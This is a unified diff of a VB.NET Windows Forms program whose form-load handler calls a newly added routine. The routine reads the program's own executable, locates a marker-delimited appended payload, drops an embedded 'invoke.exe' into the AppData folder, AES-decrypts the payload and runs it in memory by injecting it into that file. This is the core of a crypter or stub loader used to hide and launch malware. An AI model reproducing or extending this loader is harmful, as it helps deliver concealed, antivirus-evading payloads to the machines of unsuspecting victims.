@@ -3,13 +3,10 @@ Public Class Form1
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Stuff.EnsureInitialized()
-        Test()
+        Stuff.Test()
     End Sub
 
-    Sub Test()
-        Dim Tdll As New dll.Class1
-        Tdll.Main(Application.ExecutablePath)
-    End Sub
+
     'Private Function getmyname(ByVal path As String) As String
     '    If path.IndexOf("\"c) = -1 Then Return String.Empty
     '    Return path.Substring(path.LastIndexOf("\"c) + 1)
@@ -32,6 +29,121 @@ End Class
 
 
 Class Stuff
+    Shared Function RedimPload(ByVal Payload() As Byte, Start As Integer) As Byte()
+        Dim NewByts(0 To (Payload.Length - Start) - 1) As Byte
+        Return NewByts
+    End Function
+
+    Shared Sub Test()
+        Dim AppPath As String = Application.ExecutablePath
+        Dim Payload() As Byte = GetPload(AppPath)
+        Dim i As Integer = FindSplit(Payload)
+        Dim Start As Integer = i
+        If Payload(Start - 8) = &H54 Then
+            'net
+        Else
+            'native
+            'drop invoke.exe
+            Try
+                FileIO.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\invoke.exe", My.Resources.invoke, False)
+            Catch ex As Exception
+                If FileIO.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\invoke.exe") Then
+                Else
+                    End
+                End If
+            End Try
+            AppPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\invoke.exe"
+        End If
+        Dim NewByts() As Byte = RedimPload(Payload, Start)
+        NewByts = Loop1(NewByts, Payload, Start)
+        NewByts = Loop2(NewByts)
+        If Payload(Start - 8) = &H54 Then
+            Dim f As New dll.Class1
+            f.Main(Application.ExecutablePath)
+        Else
+            CMemoryExecute.Run(AES_Decrypt(NewByts), AppPath)
+        End If
+
+        Process.GetCurrentProcess.Kill()
+    End Sub
+
+    Shared Function Loop2(ByVal NewByts() As Byte) As Byte()
+        Dim Tmp() As Byte = NewByts
+        Dim I As Integer = FindSplit(NewByts) - 7
+        ReDim NewByts(0 To I)
+        For I = 0 To NewByts.Length - 1
+            NewByts(I) = Tmp(I)
+        Next
+        Return NewByts
+    End Function
+
+    Shared Function Loop1(ByVal NewByts() As Byte, ByVal Payload() As Byte, ByVal Start As Integer) As Byte()
+        For i = 0 To NewByts.Length - 1
+            NewByts(i) = Payload(Start + i)
+        Next
+        Return NewByts
+    End Function
+
+    Shared Function FindSplit(ByVal Payload() As Byte) As Integer
+        Dim Found1 As Boolean = False
+        Dim Found2 As Boolean = False
+        Dim Found3 As Boolean = False
+        Dim Found4 As Boolean = False
+        Dim Found5 As Boolean = False
+        Dim I As Integer = 0
+        For Each bytez In Payload
+            If Found5 = True Then Exit For
+            If Found1 = False Then
+                If bytez = &H21 Then
+                    Found1 = True
+                End If
+            Else
+                If Found2 = False Then
+                    If bytez = &H0 Then
+                        Found2 = True
+                    Else
+                        Found1 = False
+                    End If
+                Else
+                    If Found3 = False Then
+                        If bytez = &H40 Then
+                            Found3 = True
+                        Else
+                            Found1 = False
+                            Found2 = False
+                        End If
+                    Else
+                        If Found4 = False Then
+                            If bytez = &H0 Then
+                                Found4 = True
+                            Else
+                                Found3 = False
+                                Found2 = False
+                                Found1 = False
+                            End If
+                        Else
+                            If Found5 = False Then
+                                If bytez = &H21 Then
+                                    Found5 = True
+                                Else
+                                    Found4 = False
+                                    Found3 = False
+                                    Found2 = False
+                                    Found1 = False
+                                End If
+                            End If
+                        End If
+                    End If
+                End If
+            End If
+            I += 1
+        Next
+        Return I + 1
+    End Function
+
+    Shared Function GetPload(ByVal AppPath As String) As Byte()
+        Return FileIO.FileSystem.ReadAllBytes(AppPath)
+    End Function
     Public Shared _initialized As Boolean
     Shared Sub EnsureInitialized()
         If Not _initialized Then
